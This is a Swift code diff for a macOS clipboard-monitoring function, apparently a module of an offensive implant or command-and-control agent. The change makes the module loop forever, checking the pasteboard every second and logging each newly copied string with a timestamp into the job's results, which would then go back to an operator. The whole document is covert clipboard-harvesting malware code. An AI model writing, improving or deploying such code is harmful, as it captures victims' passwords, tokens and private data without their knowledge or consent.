@@ -9,23 +9,29 @@ import Foundation
 import Cocoa
 
 func clipboard(job: Job) {
+    job.status = "clipboard"
     
     let pasteboard = NSPasteboard.general
     var changeCount = NSPasteboard.general.changeCount
+    var tempClipboardData = ""
     while true {
         Thread.sleep(forTimeInterval: 1.0)
         if let clipboardData = pasteboard.string(forType: .string)
         {
             if pasteboard.changeCount != changeCount
             {
-                job.result += "[+] Active Application: \(NSWorkspace.shared.frontmostApplication?.localizedName)\n"
-                job.result += "[+] Copy event detected at \(NSDate()) (UTC)!\n"
-                job.result += "[+] Clipboard Data:\n\(clipboardData)\n"
                 changeCount = pasteboard.changeCount
-                break;
+                
+                if tempClipboardData != clipboardData
+                {
+                    //job.result += "[+] Active Application: \(NSWorkspace.shared.frontmostApplication?.localizedName)\n" //this doesn't work after the first call
+                    job.result += "[+] Copy event detected at \(NSDate()) (UTC)!\n"
+                    job.result += "[+] Clipboard Data:\n\(clipboardData)\n\n"
+                    tempClipboardData = clipboardData
+                    
+                }
+                
             }
         }
     }
-    job.completed = true
-    job.success = true
 }
